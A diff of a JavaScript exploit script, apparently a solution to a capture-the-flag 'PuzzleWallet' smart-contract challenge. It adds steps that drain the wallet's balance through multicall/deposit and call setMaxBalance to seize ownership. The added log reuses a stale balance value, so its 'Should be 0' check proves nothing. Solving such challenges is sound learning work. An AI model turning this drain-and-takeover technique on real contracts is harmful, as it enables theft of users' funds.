@@ -41,7 +41,8 @@ const attackPuzzleWallet = async () => {
     const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
     const tx2 = await contractPuzzleWallet.addToWhitelist(playerAddress);
     // get balance of puzzle contract
-    const playerBalance = await provider.getBalance(puzzleWalletAddress);
+    const puzzleWalletBalance = await provider.getBalance(puzzleWalletAddress);
+    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance}`);
     // TODO: fill in function call signature
     const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
     const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
@@ -57,6 +58,10 @@ const attackPuzzleWallet = async () => {
         ethers.utils.parseEther("0.002"),
         "0x"
     );
+    // puzzlew wallet balance should be 0
+    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
+    //set maxbalance to change owner to player
+    const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
 };
 
 attackPuzzleWallet()
